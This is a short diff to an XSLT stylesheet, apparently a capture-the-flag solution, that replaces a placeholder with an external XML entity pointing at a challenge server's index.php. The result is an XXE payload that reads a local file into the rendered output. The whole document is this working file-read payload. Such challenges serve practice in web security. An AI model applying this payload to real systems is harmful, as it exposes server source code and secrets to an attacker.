@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "path/to/file">]>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/challenge/web-serveur/ch50/index.php">]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/events">
     Events &ext_file;:
